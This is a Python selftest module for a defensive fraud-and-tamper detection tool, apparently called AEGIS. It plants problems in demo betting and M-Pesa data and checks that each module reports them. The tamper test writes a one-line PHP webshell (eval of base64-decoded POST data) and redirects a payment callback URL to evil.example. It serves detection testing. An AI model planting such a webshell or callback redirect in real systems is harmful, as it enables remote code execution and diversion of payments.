"""
`aegis selftest` - prove every module still catches what it should.

Builds the demo data (sportsbook DB + CSV export, M-Pesa statement + callback log,
a demo server image, a small app for the tamper alarm), runs each module against it,
and compares the findings with the planted answer keys. Every run also verifies its
own audit chain. Nothing outside the chosen folder is touched.

Use it after any change to AEGIS, and in front of a client: "here is what we planted,
here is what the tool found - nothing missed, nothing invented".
"""
from __future__ import annotations

import contextlib
import io
import json
import os
import shutil
import sqlite3
import tempfile
import time


def _cli(*argv) -> tuple[int, str]:
    from .cli import main
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
        try:
            rc = main(list(argv))
        except SystemExit as e:
            rc = e.code if isinstance(e.code, int) else 1
    return rc, buf.getvalue()


def _counts(path: str, key: str = "module_findings") -> dict:
    with open(path, "r", encoding="utf-8") as fh:
        res = json.load(fh)
    return {f["code"]: f["count"] for f in res.get(key) or []}


def _audit_ok(folder: str) -> bool:
    from .audit import AuditLog
    return AuditLog.verify(os.path.join(folder, "audit.jsonl"))[0]


def run(work: str) -> list[tuple[str, bool, str]]:
    from .demo_host import PLANTED_HOST, PLANTED_HOST_POSIX
    from .demo_ledger import PLANTED, PLANTED_MPESA

    ack = ("--acknowledge", "AEGIS selftest on demo data")
    out: list[tuple[str, bool, str]] = []

    def check(name, expected, got, folder):
        ok = expected == got and _audit_ok(folder)
        diff = "" if expected == got else "  diff: " + ", ".join(
            f"{k} expected {expected.get(k, 0)} got {got.get(k, 0)}"
            for k in sorted(set(expected) | set(got)) if expected.get(k) != got.get(k))
        out.append((name, ok, f"{sum(got.values())} found / {sum(expected.values())} planted{diff}"
                    + ("" if _audit_ok(folder) else "  AUDIT CHAIN FAILED")))

    demo = os.path.join(work, "demo")
    _cli("demo-ledger", "--out", demo)
    db = os.path.join(demo, "demo_sportsbook.db")
    _cli("db", "map", db, "--out", os.path.join(work, "map"), *ack)
    mp = os.path.join(work, "map", "ledger-map.json")

    # 1-2. ledger watchdog on SQLite and on the CSV export
    for label, target in (("Ledger watchdog (SQLite)", db), ("Ledger watchdog (CSV export)", os.path.join(demo, "csv_export"))):
        f = os.path.join(work, "ledger-" + ("csv" if "CSV" in label else "sqlite"))
        _cli("ledger", "--db", target, "--map", mp, "--out", f, *ack)
        check(label, PLANTED, _counts(os.path.join(f, "ledger-results.json"), "ledger_findings"), f)

    # 3. M-Pesa guard
    f = os.path.join(work, "mpesa")
    _cli("mpesa", "--statement", os.path.join(demo, "mpesa", "statement.csv"),
         "--callbacks", os.path.join(demo, "mpesa", "callbacks.jsonl"), "--db", db, "--map", mp, "--out", f, *ack)
    check("M-Pesa guard", PLANTED_MPESA, _counts(os.path.join(f, "mpesa-results.json")), f)

    # 4. server check-up on the demo image
    _cli("demo-host", "--out", demo)
    f = os.path.join(work, "host")
    _cli("host", "--root", os.path.join(demo, "demo-server"), "--out", f, *ack)
    exp = dict(PLANTED_HOST, **(PLANTED_HOST_POSIX if os.name != "nt" else {}))
    check("Server check-up" + (" (no file-permission checks on Windows)" if os.name == "nt" else ""),
          exp, _counts(os.path.join(f, "host-results.json")), f)

    # 5. tamper alarm: baseline, attack, detect; then an edited baseline is caught
    app = os.path.join(work, "tamper-app")
    for d in ("app/Services", "app/Http", "config", "public/uploads"):
        os.makedirs(os.path.join(app, d), exist_ok=True)
    seed = {"app/Services/Settlement.php": "<?php function settle($b){return $b->stake*$b->odds;}\n",
            "app/Http/Kernel.php": "<?php class Kernel {}\n", "config/app.yml": "name: sb\n",
            ".env": "MPESA_CALLBACK_URL=https://sb.example/cb\n", "public/uploads/a.png": "PNG"}
    for p, t in seed.items():
        with open(os.path.join(app, p), "w", encoding="utf-8") as fh:
            fh.write(t)
    tdb = os.path.join(work, "tamper.db")
    shutil.copy(db, tdb)
    f = os.path.join(work, "tamper")
    _cli("tamper", "baseline", "--path", app, "--db", tdb, "--map", mp, "--out", f, "--by", "selftest",
         "--note", "baseline", *ack)
    rc_quiet, _ = _cli("tamper", "check", "--db", tdb, "--out", f, *ack)
    quiet = _counts(os.path.join(f, "tamper-results.json"))
    with open(os.path.join(app, "app/Services/Settlement.php"), "a", encoding="utf-8") as fh:
        fh.write("// if user==P1005 pay x50\n")
    with open(os.path.join(app, "public/uploads/x.php"), "w", encoding="utf-8") as fh:
        fh.write("<?php eval(base64_decode($_POST['c']));\n")
    with open(os.path.join(app, ".env"), "w", encoding="utf-8") as fh:
        fh.write("MPESA_CALLBACK_URL=https://evil.example/cb\n")
    with open(os.path.join(app, "app/Http/Kernel.php"), "a", encoding="utf-8") as fh:
        fh.write("// changed\n")
    os.remove(os.path.join(app, "config/app.yml"))
    c = sqlite3.connect(tdb)
    c.execute("CREATE TRIGGER boost AFTER INSERT ON wallet_ledger BEGIN SELECT 1; END")
    c.commit()
    c.close()
    _cli("tamper", "check", "--db", tdb, "--out", f, *ack)
    exp = {"MONEY_CODE_CHANGED": 1, "SCRIPT_IN_UPLOAD_DIR": 1, "WEBSHELL_SUSPECT": 1, "CONFIG_CHANGED": 1,
           "CODE_CHANGED": 1, "FILE_DELETED": 1, "DB_TRIGGER_CHANGED": 1}
    got = _counts(os.path.join(f, "tamper-results.json"))
    if quiet:
        got = dict(got, QUIET_RUN_WAS_NOT_QUIET=sum(quiet.values()))
    check("Tamper alarm", exp, got, f)
    bf = os.path.join(f, "tamper-baseline.json")
    with open(bf, "r", encoding="utf-8") as fh:
        b = json.load(fh)
    k = next(p for p in b["files"] if p.endswith("Settlement.php"))
    b["files"][k][0] = "0" * 64
    with open(bf, "w", encoding="utf-8") as fh:
        json.dump(b, fh, indent=1, sort_keys=True)
    _cli("tamper", "check", "--db", tdb, "--out", f, *ack)
    t = _counts(os.path.join(f, "tamper-results.json")).get("BASELINE_TAMPERED", 0)
    rc_appr, _ = _cli("tamper", "approve", "--by", "selftest", "--note", "should be refused", "--out", f, *ack)
    out.append(("Tamper alarm: edited baseline detected, approval of webshell refused", t == 1 and rc_appr == 3,
                f"BASELINE_TAMPERED={t}, approve exit={rc_appr} (3 = refused)"))
    return out


def cmd_selftest(args) -> int:
    from . import TOOL_NAME, __version__
    work = args.out or tempfile.mkdtemp(prefix="aegis-selftest-")
    if os.path.exists(work) and os.listdir(work):
        if not os.path.exists(os.path.join(work, ".aegis-selftest")):
            print(f"{work} is not empty and is not a previous selftest folder - choose an empty folder.")
            return 2
        shutil.rmtree(work)                       # only ever deletes a folder selftest itself created
    os.makedirs(work, exist_ok=True)
    open(os.path.join(work, ".aegis-selftest"), "w").close()
    print(f"{TOOL_NAME} {__version__} selftest - working in {work}")
    t0 = time.time()
    results = run(work)
    width = max(len(n) for n, _, _ in results)
    for name, ok, detail in results:
        print(f"  [{'PASS' if ok else 'FAIL'}] {name:<{width}}  {detail}")
    passed = sum(ok for _, ok, _ in results)
    print(f"{passed}/{len(results)} passed in {time.time() - t0:.1f}s")
    return 0 if passed == len(results) else 1


def register(sub) -> None:
    s = sub.add_parser("selftest", help="build demo data with planted problems and prove every module catches them")
    s.add_argument("--out", help="working folder (default: a new temporary folder)")
    s.set_defaults(func=cmd_selftest)
